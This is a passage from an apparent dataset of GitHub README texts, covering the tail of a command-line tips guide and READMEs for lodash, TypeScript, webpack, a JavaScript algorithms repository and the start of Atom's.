entr as well.\n\n\ntac: print files in reverse\n\n\ncomm: compare sorted files line by line\n\n\nstrings: extract text from binary files\n\n\ntr: character translation or manipulation\n\n\niconv or uconv: conversion for text encodings\n\n\nsplit and csplit: splitting files\n\n\nsponge: read all input before writing it, useful for reading from then writing to the same file, e.g., grep -v something some-file | sponge some-file\n\n\nunits: unit conversions and calculations; converts furlongs per fortnight to twips per blink (see also /usr/share/units/definitions.units)\n\n\napg: generates random passwords\n\n\nxz: high-ratio file compression\n\n\nldd: dynamic library info\n\n\nnm: symbols from object files\n\n\nab or wrk: benchmarking web servers\n\n\nstrace: system call debugging\n\n\nmtr: better traceroute for network debugging\n\n\ncssh: visual concurrent shell\n\n\nrsync: sync files and folders over SSH or in local file system\n\n\nwireshark and tshark: packet capture and network debugging\n\n\nngrep: grep for the network layer\n\n\nhost and dig: DNS lookups\n\n\nlsof: process file descriptor and socket info\n\n\ndstat: useful system stats\n\n\nglances: high level, multi-subsystem overview\n\n\niostat: Disk usage stats\n\n\nmpstat: CPU usage stats\n\n\nvmstat: Memory usage stats\n\n\nhtop: improved version of top\n\n\nlast: login history\n\n\nw: who's logged on\n\n\nid: user/group identity info\n\n\nsar: historic system stats\n\n\niftop or nethogs: network utilization by socket or process\n\n\nss: socket statistics\n\n\ndmesg: boot and system error messages\n\n\nsysctl: view and configure Linux kernel parameters at run time\n\n\nhdparm: SATA/ATA disk manipulation/performance\n\n\nlsblk: list block devices: a tree view of your disks and disk partitions\n\n\nlshw, lscpu, lspci, lsusb, dmidecode: hardware information, including CPU, BIOS, RAID, graphics, devices, etc.\n\n\nlsmod and modinfo: List and show details of kernel modules.\n\n\nfortune, ddate, and sl: um, well, it depends on whether you consider steam locomotives and Zippy quotations \"useful\"\n\n\nmacOS only\nThese are items relevant only on macOS.\n\n\nPackage management with brew (Homebrew) and/or port (MacPorts). These can be used to install on macOS many of the above commands.\n\n\nCopy output of any command to a desktop app with pbcopy and paste input from one with pbpaste.\n\n\nTo enable the Option key in macOS Terminal as an alt key (such as used in the commands above like alt-b, alt-f, etc.), open Preferences -> Profiles -> Keyboard and select \"Use Option as Meta key\".\n\n\nTo open a file with a desktop app, use open or open -a /Applications/Whatever.app.\n\n\nSpotlight: Search files with mdfind and list metadata (such as photo EXIF info) with mdls.\n\n\nBe aware macOS is based on BSD Unix, and many commands (for example ps, ls, tail, awk, sed) have many subtle variations from Linux, which is largely influenced by System V-style Unix and GNU tools. You can often tell the difference by noting a man page has the heading \"BSD General Commands Manual.\" In some cases GNU versions can be installed, too (such as gawk and gsed for GNU awk and sed). If writing cross-platform Bash scripts, avoid such commands (for example, consider Python or perl) or test carefully.\n\n\nTo get macOS release information, use sw_vers.\n\n\nWindows only\nThese items are relevant only on Windows.\nWays to obtain Unix tools under Windows\n\n\nAccess the power of the Unix shell under Microsoft Windows by installing Cygwin. Most of the things described in this document will work out of the box.\n\n\nOn Windows 10, you can use Windows Subsystem for Linux (WSL), which provides a familiar Bash environment with Unix command line utilities.\n\n\nIf you mainly want to use GNU developer tools (such as GCC) on Windows, consider MinGW and its MSYS package, which provides utilities such as bash, gawk, make and grep. MSYS doesn't have all the features compared to Cygwin. MinGW is particularly useful for creating native Windows ports of Unix tools.\n\n\nAnother option to get Unix look and feel under Windows is Cash. Note that only very few Unix commands and command-line options are available in this environment.\n\n\nUseful Windows command-line tools\n\n\nYou can perform and script most Windows system administration tasks from the command line by learning and using wmic.\n\n\nNative command-line Windows networking tools you may find useful include ping, ipconfig, tracert, and netstat.\n\n\nYou can perform many useful Windows tasks by invoking the Rundll32 command.\n\n\nCygwin tips and tricks\n\n\nInstall additional Unix programs with the Cygwin's package manager.\n\n\nUse mintty as your command-line window.\n\n\nAccess the Windows clipboard through /dev/clipboard.\n\n\nRun cygstart to open an arbitrary file through its registered application.\n\n\nAccess the Windows registry with regtool.\n\n\nNote that a C:\\ Windows drive path becomes /cygdrive/c under Cygwin, and that Cygwin's / appears under C:\\cygwin on Windows. Convert between Cygwin and Windows-style file paths with cygpath. This is most useful in scripts that invoke Windows programs.\n\n\nMore resources\n\nawesome-shell: A curated list of shell tools and resources.\nawesome-osx-command-line: A more in-depth guide for the macOS command line.\nStrict mode for writing better shell scripts.\nshellcheck: A shell script static analysis tool. Essentially, lint for bash/sh/zsh.\nFilenames and Pathnames in Shell: The sadly complex minutiae on how to handle filenames correctly in shell scripts.\nData Science at the Command Line: More commands and tools helpful for doing data science, from the book of the same name\n\nDisclaimer\nWith the exception of very small tasks, code is written so others can read it. With power comes responsibility. The fact you can do something in Bash doesn't necessarily mean you should! ;)\nLicense\n\nThis work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License."}, {"title": "lodash/lodash", "language": "JavaScript", "content": "lodash\nSite |\nDocs |\nFP Guide |\nContributing |\nWiki |\nCode of Conduct |\nTwitter |\nChat\nThe Lodash library exported as a UMD module.\nGenerated using lodash-cli:\n$ npm run build\n$ lodash -o ./dist/lodash.js\n$ lodash core -o ./dist/lodash.core.js\nDownload\n\nCore build (~4 kB gzipped)\nFull build (~24 kB gzipped)\nCDN copies \n\nLodash is released under the MIT license & supports modern environments.\nReview the build differences & pick one that\u2019s right for you.\nInstallation\nIn a browser:\n<script src=\"lodash.js\"></script>\nUsing npm:\n$ npm i -g npm\n$ npm i lodash\nNote: add --save if you are using npm < 5.0.0\nIn Node.js:\n// Load the full build.\nvar _ = require('lodash');\n// Load the core build.\nvar _ = require('lodash/core');\n// Load the FP build for immutable auto-curried iteratee-first data-last methods.\nvar fp = require('lodash/fp');\n\n// Load method categories.\nvar array = require('lodash/array');\nvar object = require('lodash/fp/object');\n\n// Cherry-pick methods for smaller browserify/rollup/webpack bundles.\nvar at = require('lodash/at');\nvar curryN = require('lodash/fp/curryN');\nLooking for Lodash modules written in ES6 or smaller bundle sizes? Check out lodash-es.\nWhy Lodash?\nLodash makes JavaScript easier by taking the hassle out of working with arrays,\nnumbers, objects, strings, etc. Lodash\u2019s modular methods are great for:\n\nIterating arrays, objects, & strings\nManipulating & testing values\nCreating composite functions\n\nModule Formats\nLodash is available in a variety of builds & module formats.\n\nlodash & per method packages\nlodash-es, babel-plugin-lodash, & lodash-webpack-plugin\nlodash/fp\nlodash-amd"}, {"title": "microsoft/TypeScript", "language": "TypeScript", "content": "TypeScript\n\nTypeScript is a language for application-scale JavaScript. TypeScript adds optional types to JavaScript that support tools for large-scale JavaScript applications for any browser, for any host, on any OS. TypeScript compiles to readable, standards-based JavaScript. Try it out at the playground, and stay up to date via our blog and Twitter account.\nInstalling\nFor the latest stable version:\nnpm install -g typescript\nFor our nightly builds:\nnpm install -g typescript@next\nContribute\nThere are many ways to contribute to TypeScript.\n\nSubmit bugs and help us verify fixes as they are checked in.\nReview the source code changes.\nEngage with other TypeScript users and developers on StackOverflow.\nJoin the #typescript discussion on Twitter.\nContribute bug fixes.\nRead the language specification (docx,\npdf, md).\n\nThis project has adopted the Microsoft Open Source Code of Conduct. For more information see\nthe Code of Conduct FAQ or contact opencode@microsoft.com\nwith any additional questions or comments.\nDocumentation\n\nQuick tutorial\nProgramming handbook\nLanguage specification\nHomepage\n\nBuilding\nIn order to build the TypeScript compiler, ensure that you have Git and Node.js installed.\nClone a copy of the repo:\ngit clone https://github.com/Microsoft/TypeScript.git\nChange to the TypeScript directory:\ncd TypeScript\nInstall Gulp tools and dev dependencies:\nnpm install -g gulp\nnpm install\nUse one of the following to build and test:\ngulp local            # Build the compiler into built/local\ngulp clean            # Delete the built compiler\ngulp LKG              # Replace the last known good with the built one.\n                      # Bootstrapping step to be executed when the built compiler reaches a stable state.\ngulp tests            # Build the test infrastructure using the built compiler.\ngulp runtests         # Run tests using the built compiler and test infrastructure.\n                      # You can override the host or specify a test for this command.\n                      # Use --host=<hostName> or --tests=<testPath>.\ngulp baseline-accept  # This replaces the baseline test results with the results obtained from gulp runtests.\ngulp lint             # Runs tslint on the TypeScript source.\ngulp help             # List the above commands.\n\nUsage\nnode built/local/tsc.js hello.ts\nRoadmap\nFor details on our planned features and future direction please refer to our roadmap."}, {"title": "webpack/webpack", "language": "JavaScript", "content": "webpack\n\n    webpack is a module bundler. Its main purpose is to bundle JavaScript files for usage in a browser, yet it is also capable of transforming, bundling, or packaging just about any resource or asset.\n  \n\nTable of Contents\n\nInstall\nIntroduction\nConcepts\nContributing\nSupport\nCore Team\nSponsoring\nPremium Partners\nOther Backers and Sponsors\nGold Sponsors\nSilver Sponsors\nBronze Sponsors\nBackers\nSpecial Thanks\n\nInstall\nInstall with npm:\nnpm install --save-dev webpack\nInstall with yarn:\nyarn add webpack --dev\nIntroduction\nwebpack is a bundler for modules. The main purpose is to bundle JavaScript\nfiles for usage in a browser, yet it is also capable of transforming, bundling,\nor packaging just about any resource or asset.\nTL;DR\n\nBundles ES Modules, CommonJS, and AMD modules (even combined).\nCan create a single bundle or multiple chunks that are asynchronously loaded at runtime (to reduce initial loading time).\nDependencies are resolved during compilation, reducing the runtime size.\nLoaders can preprocess files while compiling, e.g. TypeScript to JavaScript, Handlebars strings to compiled functions, images to Base64, etc.\nHighly modular plugin system to do whatever else your application requires.\n\nGet Started\nCheck out webpack's quick Get Started guide and the other guides.\nBrowser Compatibility\nwebpack supports all browsers that are ES5-compliant (IE8 and below are not supported).\nwebpack also needs Promise for import() and require.ensure(). If you want to support older browsers, you will need to load a polyfill before using these expressions.\nConcepts\nPlugins\nwebpack has a rich plugin\ninterface. Most of the features\nwithin webpack itself use this plugin interface. This makes webpack very\nflexible.\n\n\n\nName\nStatus\nInstall Size\nDescription\n\n\n\n\nmini-css-extract-plugin\n\n\nExtracts CSS into separate files. It creates a CSS file per JS file which contains CSS.\n\n\ncompression-webpack-plugin\n\n\nPrepares compressed versions of assets to serve them with Content-Encoding\n\n\ni18n-webpack-plugin\n\n\nAdds i18n support to your bundles\n\n\nhtml-webpack-plugin\n\n\nSimplifies creation of HTML files (index.html) to serve your bundles\n\n\nextract-text-webpack-plugin\n\n\nExtract text from a bundle, or bundles, into a separate file\n\n\n\nLoaders\nwebpack enables use of loaders to preprocess files. This allows you to bundle\nany static resource way beyond JavaScript. You can easily write your own\nloaders using Node.js.\nLoaders are activated by using loadername! prefixes in require() statements,\nor are automatically applied via regex from your webpack configuration.\nFiles\n\n\n\nName\nStatus\nInstall Size\nDescription\n\n\n\n\nraw-loader\n\n\nLoads raw content of a file (utf-8)\n\n\nval-loader\n\n\nExecutes code as module and considers exports as JS code\n\n\nurl-loader\n\n\nWorks like the file loader, but can return a Data Url if the file is smaller than a limit\n\n\nfile-loader\n\n\nEmits the file into the output folder and returns the (relative) url\n\n\n\nJSON\n\n\n\nName\nStatus\nInstall Size\nDescription\n\n\n\n\n\n\n\nLoads a JSON file (included by default)\n\n\n\n\n\nLoads and transpiles a JSON 5 file\n\n\n\n\n\nLoads and transpiles a CSON file\n\n\n\nTranspiling\n\n\n\nName\nStatus\nInstall Size\nDescription\n\n\n\n\n<script>\n\n\nExecutes a JavaScript file once in global context (like in script tag), require()s are not parsed\n\n\n\n\n\nLoads ES2015+ code and transpiles to ES5 using Babel\n\n\n\n\n\nLoads ES2015+ code and transpiles to ES5 using Traceur\n\n\n\n\n\nLoads TypeScript like JavaScript\n\n\nawesome-typescript-loader\n\n\nAwesome TypeScript loader for webpack\n\n\n\n\n\nLoads CoffeeScript like JavaScript\n\n\n\nTemplating\n\n\n\nName\nStatus\nInstall Size\nDescription\n\n\n\n\n\n\n\nExports HTML as string, requires references to static resources\n\n\n\n\n\nLoads Pug templates and returns a function\n\n\n\n\n\nLoads Jade templates and returns a function\n\n\n\n\n\nCompiles Markdown to HTML\n\n\n\n\n\nLoads and transforms a HTML file using PostHTML\n\n\n\n\n\nCompiles Handlebars to HTML\n\n\n\nStyling\n\n\n\nName\nStatus\nInstall Size\nDescription\n\n\n\n\n<style>\n\n\nAdd exports of a module as style to DOM\n\n\n\n\n\nLoads CSS file with resolved imports and returns CSS code\n\n\n\n\n\nLoads and compiles a LESS file\n\n\n\n\n\nLoads and compiles a Sass/SCSS file\n\n\n\n\n\nLoads and compiles a Stylus file\n\n\n\n\n\nLoads and transforms a CSS/SSS file using PostCSS\n\n\n\nLinting & Testing\n\n\n\nName\nStatus\nInstall Size\nDescription\n\n\n\n\n\n\n\nTests with mocha (Browser/NodeJS)\n\n\n\n\n\nPreLoader for linting code using ESLint\n\n\n\n\n\nPreLoader for linting code using JSHint\n\n\n\nFrameworks\n\n\n\nName\nStatus\nInstall Size\nDescription\n\n\n\n\n\n\n\nLoads and compiles Vue Components\n\n\n\n\n\nProcess HTML & CSS with preprocessor of choice and require() Web Components like first-class modules\n\n\n\n\n\nLoads and compiles Angular 2 Components\n\n\n\n\n\nRiot official webpack loader\n\n\n\nPerformance\nwebpack uses async I/O and has multiple caching levels. This makes webpack fast\nand incredibly fast on incremental compilations.\nModule Formats\nwebpack supports ES2015+, CommonJS and AMD modules out of the box. It performs clever static\nanalysis on the AST of your code. It even has an evaluation engine to evaluate\nsimple expressions. This allows you to support most existing libraries out of the box.\nCode Splitting\nwebpack allows you to split your codebase into multiple chunks. Chunks are\nloaded asynchronously at runtime. This reduces the initial loading time.\nOptimizations\nwebpack can do many optimizations to reduce the output size of your\nJavaScript by deduplicating frequently used modules, minifying, and giving\nyou full control of what is loaded initially and what is loaded at runtime\nthrough code splitting. It can also make your code chunks cache\nfriendly by using hashes.\nContributing\nWe want contributing to webpack to be fun, enjoyable, and educational for anyone, and everyone. We have a vibrant ecosystem that spans beyond this single repo. We welcome you to check out any of the repositories in our organization or webpack-contrib organization which houses all of our loaders and plugins.\nContributions go far beyond pull requests and commits. Although we love giving you the opportunity to put your stamp on webpack, we also are thrilled to receive a variety of other contributions including:\n\nDocumentation updates, enhancements, designs, or bugfixes\nSpelling or grammar fixes\nREADME.md corrections or redesigns\nAdding unit, or functional tests\nTriaging GitHub issues -- especially determining whether an issue still persists or is reproducible.\nSearching #webpack on twitter and helping someone else who needs help\nTeaching others how to contribute to one of the many webpack's repos!\nBlogging, speaking about, or creating tutorials about one of webpack's many features.\nHelping others in our webpack gitter channel.\n\nIf you are worried or don't know where to start, you can always reach out to Sean Larkin (@TheLarkInn) on Twitter or simply submit an issue and a maintainer can help give you guidance!\nWe have also started a series on our Medium Publication called The Contributor's Guide to webpack. We welcome you to read it and post any questions or responses if you still need help.\nLooking to speak about webpack? We'd love to review your talk abstract/CFP! You can email it to webpack [at] opencollective [dot] com and we can give pointers or tips!!!\nCreating your own plugins and loaders\nIf you create a loader or plugin, we would <3 for you to open source it, and put it on npm. We follow the x-loader, x-webpack-plugin naming convention.\nSupport\nWe consider webpack to be a low-level tool used not only individually but also layered beneath other awesome tools. Because of its flexibility, webpack isn't always the easiest entry-level solution, however we do believe it is the most powerful. That said, we're always looking for ways improve and simplify the tool without compromising functionality. If you have any ideas on ways to accomplish this, we're all ears!\nIf you're just getting started, take a look at our new docs and concepts page. This has a high level overview that is great for beginners!!\nLooking for webpack 1 docs? Please check out the old wiki, but note that this deprecated version is no longer supported.\nIf you want to discuss something or just need help, here is our Gitter room where there are always individuals looking to help out!\nIf you are still having difficulty, we would love for you to post\na question to StackOverflow with the webpack tag. It is much easier to answer questions that include your webpack.config.js and relevant files! So if you can provide them, we'd be extremely grateful (and more likely to help you find the answer!)\nIf you are twitter savvy you can tweet #webpack with your question and someone should be able to reach out and help also.\nIf you have discovered a \ud83d\udc1c or have a feature suggestion, feel free to create an issue on Github.\nLicense\n\nCore Team\n\n\n\n\n\n\nTobias Koppers\nCore\n\nFounder of webpack\n\n\n\n\nJohannes Ewald\nLoaders & Plugins\n\nEarly adopter of webpack\n\n\n\n\nSean T. Larkin\nPublic Relations\n\nFounder of the core team\n\n\n\n\nKees Kluskens\nDevelopment\n\nSponsor\n\n\n\n\n\n\n\n\nSponsoring\nMost of the core team members, webpack contributors and contributors in the ecosystem do this open source work in their free time. If you use webpack for a serious task, and you'd like us to invest more time on it, please donate. This project increases your income/productivity too. It makes development and applications faster and it reduces the required bandwidth.\nThis is how we use the donations:\n\nAllow the core team to work on webpack\nThank contributors if they invested a large amount of time in contributing\nSupport projects in the ecosystem that are of great value for users\nSupport projects that are voted most (work in progress)\nInfrastructure cost\nFees for money handling\n\nPremium Partners\n\n\n\n\nOther Backers and Sponsors\nBefore we started using OpenCollective, donations were made anonymously. Now that we have made the switch, we would like to acknowledge these sponsors (and the ones who continue to donate using OpenCollective). If we've missed someone, please send us a PR, and we'll add you to this list.\n\nGoogle Angular Team, Architects.io,\n\n\n\nGold Sponsors\nBecome a gold sponsor and get your logo on our README on Github with a link to your site.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSilver Sponsors\nBecome a silver sponsor and get your logo on our README on Github with a link to your site.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBronze Sponsors\nBecome a bronze sponsor and get your logo on our README on Github with a link to your site.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBackers\nBecome a backer and get your image on our README on Github with a link to your site.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSpecial Thanks to\n(In chronological order)\n\n@google for Google Web Toolkit (GWT), which aims to compile Java to JavaScript. It features a similar Code Splitting as webpack.\n@medikoo for modules-webmake, which is a similar project. webpack was born because I wanted Code Splitting for modules-webmake. Interestingly the Code Splitting issue is still open (thanks also to @Phoscur for the discussion).\n@substack for browserify, which is a similar project and source for many ideas.\n@jrburke for require.js, which is a similar project and source for many ideas.\n@defunctzombie for the browser-field spec, which makes modules available for node.js, browserify and webpack.\nEvery early webpack user, which contributed to webpack by writing issues or PRs. You influenced the direction...\n@shama, @jhnns and @sokra for maintaining this project\nEveryone who has written a loader for webpack. You are the ecosystem...\nEveryone I forgot to mention here, but also influenced webpack."}, {"title": "trekhleb/javascript-algorithms", "language": "JavaScript", "content": "JavaScript Algorithms and Data Structures\n\n\nThis repository contains JavaScript based examples of many\npopular algorithms and data structures.\nEach algorithm and data structure has its own separate README\nwith related explanations and links for further reading (including ones\nto YouTube videos).\nRead this in other languages:\n\u7b80\u4f53\u4e2d\u6587,\n\u7e41\u9ad4\u4e2d\u6587,\n\ud55c\uad6d\uc5b4,\n\u65e5\u672c\u8a9e,\nPolski,\nFran\u00e7ais,\nEspa\u00f1ol,\nPortugu\u00eas\n\u261d Note that this project is meant to be used for learning and researching purposes\nonly and it is not meant to be used for production.\nData Structures\nA data structure is a particular way of organizing and storing data in a computer so that it can\nbe accessed and modified efficiently. More precisely, a data structure is a collection of data\nvalues, the relationships among them, and the functions or operations that can be applied to\nthe data.\nB - Beginner, A - Advanced\n\nB Linked List\nB Doubly Linked List\nB Queue\nB Stack\nB Hash Table\nB Heap - max and min heap versions\nB Priority Queue\nA Trie\nA Tree\n\nA Binary Search Tree\nA AVL Tree\nA Red-Black Tree\nA Segment Tree - with min/max/sum range queries examples\nA Fenwick Tree (Binary Indexed Tree)\n\n\nA Graph (both directed and undirected)\nA Disjoint Set\nA Bloom Filter\n\nAlgorithms\nAn algorithm is an unambiguous specification of how to solve a class of problems. It is\na set of rules that precisely define a sequence of operations.\nB - Beginner, A - Advanced\nAlgorithms by Topic\n\nMath\n\nB Bit Manipulation - set/get/update/clear bits, multiplication/division by two, make negative etc.\nB Factorial\nB Fibonacci Number - classic and closed-form versions\nB Primality Test (trial division method)\nB Euclidean Algorithm - calculate the Greatest Common Divisor (GCD)\nB Least Common Multiple (LCM)\nB Sieve of Eratosthenes - finding all prime numbers up to any given limit\nB Is Power of Two - check if the number is power of two (naive and bitwise algorithms)\nB Pascal's Triangle\nB Complex Number - complex numbers and basic operations with them\nB Radian & Degree - radians to degree and backwards conversion\nB Fast Powering\nA Integer Partition\nA Square Root - Newton's method\nA Liu Hui \u03c0 Algorithm - approximate \u03c0 calculations based on N-gons\nA Discrete Fourier Transform - decompose a function of time (a signal) into the frequencies that make it up\n\n\nSets\n\nB Cartesian Product - product of multiple sets\nB Fisher\u2013Yates Shuffle - random permutation of a finite sequence\nA Power Set - all subsets of a set (bitwise and backtracking solutions)\nA Permutations (with and without repetitions)\nA Combinations (with and without repetitions)\nA Longest Common Subsequence (LCS)\nA Longest Increasing Subsequence\nA Shortest Common Supersequence (SCS)\nA Knapsack Problem - \"0/1\" and \"Unbound\" ones\nA Maximum Subarray - \"Brute Force\" and \"Dynamic Programming\" (Kadane's) versions\nA Combination Sum - find all combinations that form specific sum\n\n\nStrings\n\nB Hamming Distance - number of positions at which the symbols are different\nA Levenshtein Distance - minimum edit distance between two sequences\nA Knuth\u2013Morris\u2013Pratt Algorithm (KMP Algorithm) - substring search (pattern matching)\nA Z Algorithm - substring search (pattern matching)\nA Rabin Karp Algorithm - substring search\nA Longest Common Substring\nA Regular Expression Matching\n\n\nSearches\n\nB Linear Search\nB Jump Search (or Block Search) - search in sorted array\nB Binary Search - search in sorted array\nB Interpolation Search - search in uniformly distributed sorted array\n\n\nSorting\n\nB Bubble Sort\nB Selection Sort\nB Insertion Sort\nB Heap Sort\nB Merge Sort\nB Quicksort - in-place and non-in-place implementations\nB Shellsort\nB Counting Sort\nB Radix Sort\n\n\nLinked Lists\n\nB Straight Traversal\nB Reverse Traversal\n\n\nTrees\n\nB Depth-First Search (DFS)\nB Breadth-First Search (BFS)\n\n\nGraphs\n\nB Depth-First Search (DFS)\nB Breadth-First Search (BFS)\nB Kruskal\u2019s Algorithm - finding Minimum Spanning Tree (MST) for weighted undirected graph\nA Dijkstra Algorithm - finding shortest paths to all graph vertices from single vertex\nA Bellman-Ford Algorithm - finding shortest paths to all graph vertices from single vertex\nA Floyd-Warshall Algorithm - find shortest paths between all pairs of vertices\nA Detect Cycle - for both directed and undirected graphs (DFS and Disjoint Set based versions)\nA Prim\u2019s Algorithm - finding Minimum Spanning Tree (MST) for weighted undirected graph\nA Topological Sorting - DFS method\nA Articulation Points - Tarjan's algorithm (DFS based)\nA Bridges - DFS based algorithm\nA Eulerian Path and Eulerian Circuit - Fleury's algorithm - Visit every edge exactly once\nA Hamiltonian Cycle - Visit every vertex exactly once\nA Strongly Connected Components - Kosaraju's algorithm\nA Travelling Salesman Problem - shortest possible route that visits each city and returns to the origin city\n\n\nCryptography\n\nB Polynomial Hash - rolling hash function based on polynomial\n\n\nUncategorized\n\nB Tower of Hanoi\nB Square Matrix Rotation - in-place algorithm\nB Jump Game - backtracking, dynamic programming (top-down + bottom-up) and greedy examples\nB Unique Paths - backtracking, dynamic programming and Pascal's Triangle based examples\nB Rain Terraces - trapping rain water problem (dynamic programming and brute force versions)\nB Recursive Staircase - count the number of ways to reach to the top (4 solutions)\nA N-Queens Problem\nA Knight's Tour\n\n\n\nAlgorithms by Paradigm\nAn algorithmic paradigm is a generic method or approach which underlies the design of a class\nof algorithms. It is an abstraction higher than the notion of an algorithm, just as an\nalgorithm is an abstraction higher than a computer program.\n\nBrute Force - look at all the possibilities and selects the best solution\n\nB Linear Search\nB Rain Terraces - trapping rain water problem\nB Recursive Staircase - count the number of ways to reach to the top\nA Maximum Subarray\nA Travelling Salesman Problem - shortest possible route that visits each city and returns to the origin city\nA Discrete Fourier Transform - decompose a function of time (a signal) into the frequencies that make it up\n\n\nGreedy - choose the best option at the current time, without any consideration for the future\n\nB Jump Game\nA Unbound Knapsack Problem\nA Dijkstra Algorithm - finding shortest path to all graph vertices\nA Prim\u2019s Algorithm - finding Minimum Spanning Tree (MST) for weighted undirected graph\nA Kruskal\u2019s Algorithm - finding Minimum Spanning Tree (MST) for weighted undirected graph\n\n\nDivide and Conquer - divide the problem into smaller parts and then solve those parts\n\nB Binary Search\nB Tower of Hanoi\nB Pascal's Triangle\nB Euclidean Algorithm - calculate the Greatest Common Divisor (GCD)\nB Merge Sort\nB Quicksort\nB Tree Depth-First Search (DFS)\nB Graph Depth-First Search (DFS)\nB Jump Game\nB Fast Powering\nA Permutations (with and without repetitions)\nA Combinations (with and without repetitions)\n\n\nDynamic Programming - build up a solution using previously found sub-solutions\n\nB Fibonacci Number\nB Jump Game\nB Unique Paths\nB Rain Terraces - trapping rain water problem\nB Recursive Staircase - count the number of ways to reach to the top\nA Levenshtein Distance - minimum edit distance between two sequences\nA Longest Common Subsequence (LCS)\nA Longest Common Substring\nA Longest Increasing Subsequence\nA Shortest Common Supersequence\nA 0/1 Knapsack Problem\nA Integer Partition\nA Maximum Subarray\nA Bellman-Ford Algorithm - finding shortest path to all graph vertices\nA Floyd-Warshall Algorithm - find shortest paths between all pairs of vertices\nA Regular Expression Matching\n\n\nBacktracking - similarly to brute force, try to generate all possible solutions, but each time you generate next solution you test\nif it satisfies all conditions, and only then continue generating subsequent solutions. Otherwise, backtrack, and go on a\ndifferent path of finding a solution. Normally the DFS traversal of state-space is being used.\n\nB Jump Game\nB Unique Paths\nB Power Set - all subsets of a set\nA Hamiltonian Cycle - Visit every vertex exactly once\nA N-Queens Problem\nA Knight's Tour\nA Combination Sum - find all combinations that form specific sum\n\n\nBranch & Bound - remember the lowest-cost solution found at each stage of the backtracking\nsearch, and use the cost of the lowest-cost solution found so far as a lower bound on the cost of\na least-cost solution to the problem, in order to discard partial solutions with costs larger than the\nlowest-cost solution found so far. Normally BFS traversal in combination with DFS traversal of state-space\ntree is being used.\n\nHow to use this repository\nInstall all dependencies\nnpm install\n\nRun ESLint\nYou may want to run it to check code quality.\nnpm run lint\n\nRun all tests\nnpm test\n\nRun tests by name\nnpm test -- 'LinkedList'\n\nPlayground\nYou may play with data-structures and algorithms in ./src/playground/playground.js file and write\ntests for it in ./src/playground/__test__/playground.test.js.\nThen just simply run the following command to test if your playground code works as expected:\nnpm test -- 'playground'\n\nUseful Information\nReferences\n\u25b6 Data Structures and Algorithms on YouTube\nBig O Notation\nBig O notation is used to classify algorithms according to how their running time or space requirements grow as the input size grows.\nOn the chart below you may find most common orders of growth of algorithms specified in Big O notation.\n\nSource: Big O Cheat Sheet.\nBelow is the list of some of the most used Big O notations and their performance comparisons against different sizes of the input data.\n\n\n\nBig O Notation\nComputations for 10 elements\nComputations for 100 elements\nComputations for 1000 elements\n\n\n\n\nO(1)\n1\n1\n1\n\n\nO(log N)\n3\n6\n9\n\n\nO(N)\n10\n100\n1000\n\n\nO(N log N)\n30\n600\n9000\n\n\nO(N^2)\n100\n10000\n1000000\n\n\nO(2^N)\n1024\n1.26e+29\n1.07e+301\n\n\nO(N!)\n3628800\n9.3e+157\n4.02e+2567\n\n\n\nData Structure Operations Complexity\n\n\n\nData Structure\nAccess\nSearch\nInsertion\nDeletion\nComments\n\n\n\n\nArray\n1\nn\nn\nn\n\n\n\nStack\nn\nn\n1\n1\n\n\n\nQueue\nn\nn\n1\n1\n\n\n\nLinked List\nn\nn\n1\nn\n\n\n\nHash Table\n-\nn\nn\nn\nIn case of perfect hash function costs would be O(1)\n\n\nBinary Search Tree\nn\nn\nn\nn\nIn case of balanced tree costs would be O(log(n))\n\n\nB-Tree\nlog(n)\nlog(n)\nlog(n)\nlog(n)\n\n\n\nRed-Black Tree\nlog(n)\nlog(n)\nlog(n)\nlog(n)\n\n\n\nAVL Tree\nlog(n)\nlog(n)\nlog(n)\nlog(n)\n\n\n\nBloom Filter\n-\n1\n1\n-\nFalse positives are possible while searching\n\n\n\nArray Sorting Algorithms Complexity\n\n\n\nName\nBest\nAverage\nWorst\nMemory\nStable\nComments\n\n\n\n\nBubble sort\nn\nn2\nn2\n1\nYes\n\n\n\nInsertion sort\nn\nn2\nn2\n1\nYes\n\n\n\nSelection sort\nn2\nn2\nn2\n1\nNo\n\n\n\nHeap sort\nn\u00a0log(n)\nn\u00a0log(n)\nn\u00a0log(n)\n1\nNo\n\n\n\nMerge sort\nn\u00a0log(n)\nn\u00a0log(n)\nn\u00a0log(n)\nn\nYes\n\n\n\nQuick sort\nn\u00a0log(n)\nn\u00a0log(n)\nn2\nlog(n)\nNo\nQuicksort is usually done in-place with O(log(n)) stack space\n\n\nShell sort\nn\u00a0log(n)\ndepends on gap sequence\nn\u00a0(log(n))2\n1\nNo\n\n\n\nCounting sort\nn + r\nn + r\nn + r\nn + r\nYes\nr - biggest number in array\n\n\nRadix sort\nn * k\nn * k\nn * k\nn + k\nYes\nk - length of longest key"}, {"title": "atom/atom", "language": "JavaScript", "content": "Atom\n  \n\n\nAtom is a hackable text editor for the 21st century, built on Electron, and based on everything we love about our favorite editors. We designed it to be deeply customizable, but still approachable using the default configuration.\n\n\nVisit atom.io to learn more or visit the Atom forum.\nFollow @AtomEditor on Twitter for important\nannouncements.\nThis project adheres to the Contributor Covenant code of conduct.\nBy participating, you are expected to uphold this code. Please report unacceptable behavior to atom@github.com.\nDocumentation\nIf you want to read about using Atom or developing packages in Atom, the Atom Flight Manual is free and available online. You can find the source to the manual in atom/flight-manual.atom.io.\nThe API reference for developing packages is also documented on Atom.io.\nInstalling\nPrerequisites\n\nGit\n\nmacOS\nDownload the latest Atom release.\nAtom will automatically update when a new release is available.\nWindows\nDownload the latest Atom installer. 